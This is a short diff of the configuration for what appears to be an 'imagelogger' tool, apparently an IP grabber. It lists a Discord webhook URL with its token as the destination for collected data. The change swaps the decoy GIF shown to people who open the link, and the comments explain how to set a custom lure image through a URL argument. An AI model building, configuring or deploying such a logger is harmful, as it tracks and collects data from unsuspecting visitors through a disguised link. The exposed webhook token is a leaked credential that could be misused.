@@ -13,7 +13,7 @@ __author__ = "SPA"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1479356780625793066/7rXrol068H49QgoP7LPjUIDM_279_7W3Mn6I4LuSA9499EM-mLaF9y4dQj0xPyysgezs",
-    "image": "https://tenor.com/en-GB/view/angry-gif-757826346443330659", # You can also have a custom image by using a URL argument
+    "image": "https://media1.tenor.com/m/d52Bg8itWicAAAAC/middle-click.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
